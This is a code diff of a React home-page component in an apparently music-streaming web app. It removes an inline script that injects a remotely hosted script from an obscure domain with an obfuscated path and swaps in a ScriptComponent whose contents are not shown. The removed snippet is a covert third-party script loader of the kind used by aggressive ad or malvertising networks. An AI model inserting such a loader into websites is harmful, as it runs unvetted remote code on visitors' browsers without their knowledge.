@@ -14,8 +14,7 @@ import SongBar from "./SongBar";
 import OnlineStatus from "./OnlineStatus";
 import ListenAgain from "./ListenAgain";
 import { setHomeCategories } from '@/redux/features/homeCategoriesSlice'
-import {Helmet} from "react-helmet";
-import Safe from "react-safe"
+import ScriptComponent from './ScriptComponent';
 
 const Home = () => {
 
@@ -139,18 +138,7 @@ const Home = () => {
       </SwiperLayout>
 )}
 
-<Safe.script>
-(function(upszm){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = upszm || {};
-s.src = "\/\/infantilecombination.com\/bGX_V.stdTGVlP0CYEWedti-YlWD5FuYZAXlIQ\/Mecm\/9lu\/ZAUJlCkZPrTcUq5eOTTAcB3-NhDAg\/taNPTgkd5CNDzqc\/0\/OQQw";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
-</Safe.script>
+<ScriptComponent />
 
       {/* New Releases */}
       {  selectedHomeCategories.includes("releases") && (
